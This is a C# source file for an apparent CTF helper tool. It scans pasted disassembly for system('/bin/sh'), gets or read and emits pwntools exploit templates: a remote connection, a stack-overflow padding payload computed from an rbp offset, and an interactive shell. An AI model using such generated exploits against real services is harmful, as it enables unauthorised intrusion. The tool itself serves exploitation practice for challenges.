using System;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace CTFTool
{
    public class PwnSimpleAnal
    {
        //属性
        private RichTextBox m_cIn;
        private RichTextBox m_cExp;
        private RichTextBox m_cOut;

        //构造
        public PwnSimpleAnal(RichTextBox cIn, RichTextBox cExp, RichTextBox cOut)
        {
            //清空显示区域
            cExp.Text = cOut.Text = "";

            //初始化
            m_cIn = cIn;
            m_cExp = cExp;
            m_cOut = cOut;
        }

        //开始
        public void Start()
        {
            Boolean bExec = false;
            bExec = bExec || PwnExistShellCode();
            bExec = bExec || PwnExistGets();
            bExec = bExec || PwnExistRead();
            if (!bExec)
            {
                m_cExp.Text = m_cExp.Text + "分析失败" + Environment.NewLine;
            }
        }

        //直接可获取shell
        private Boolean PwnExistShellCode()
        {
            if (m_cIn.Text.Contains("system(\"/bin/sh\")"))
            {
                //说明
                m_cExp.Text += "函数中存在ShellCode!";

                //输出
                m_cOut.Text += "from pwn import *\n";
                m_cOut.Text += "\n";
                Regex vRegex = new Regex("(.*?):(\\d+)", RegexOptions.Multiline);
                Match vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    m_cOut.Text += "process = remote('" + vMatch.Groups[1].Value + "', " + vMatch.Groups[2].Value + ")\n";
                }
                else
                {
                    m_cOut.Text += "process = remote('IP', Port)\n";
                }
                m_cOut.Text += "process.interactive()\n";

                return true;
            }
            return false;
        }

        //存在gets函数
        private Boolean PwnExistGets()
        {
            if (m_cIn.Text.Contains("gets"))
            {
                //说明
                m_cExp.Text += "函数中存在漏洞函数gets!";

                //输出
                m_cOut.Text += "from pwn import *\n";
                m_cOut.Text += "\n";
                Regex vRegex = new Regex("(.*?):(\\d+)", RegexOptions.Multiline);
                Match vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    m_cOut.Text += "process = remote('" + vMatch.Groups[1].Value + "', " + vMatch.Groups[2].Value + ")\n";
                }
                else
                {
                    m_cOut.Text += "process = remote('IP', Port)\n";
                }
                vRegex = new Regex("\\[rbp-(.*?)h\\]");
                vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    m_cOut.Text += "payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress)\n";
                    m_cOut.Text += "# payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress + 1)\n";
                    m_cOut.Text += "process.sendline(payload)\n";
                }
                m_cOut.Text += "process.interactive()\n";

                return true;
            }
            return false;
        }

        //存在gets函数
        private Boolean PwnExistRead()
        {
            if (m_cIn.Text.Contains("read"))
            {
                //说明
                m_cExp.Text += "函数中存在漏洞函数read!";

                //输出
                m_cOut.Text += "from pwn import *\n";
                m_cOut.Text += "\n";
                Regex vRegex = new Regex("(.*?):(\\d+)", RegexOptions.Multiline);
                Match vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    m_cOut.Text += "process = remote('" + vMatch.Groups[1].Value + "', " + vMatch.Groups[2].Value + ")\n";
                }
                else
                {
                    m_cOut.Text += "process = remote('IP', Port)\n";
                }
                vRegex = new Regex("\\[rbp-(.*?)h\\]");
                vMatch = vRegex.Match(m_cIn.Text);
                if (vMatch.Success)
                {
                    m_cOut.Text += "payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress)\n";
                    m_cOut.Text += "# payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress + 1)\n";
                    m_cOut.Text += "process.sendline(payload)\n";
                }
                m_cOut.Text += "process.interactive()\n";

                return true;
            }
            return false;
        }
    }
}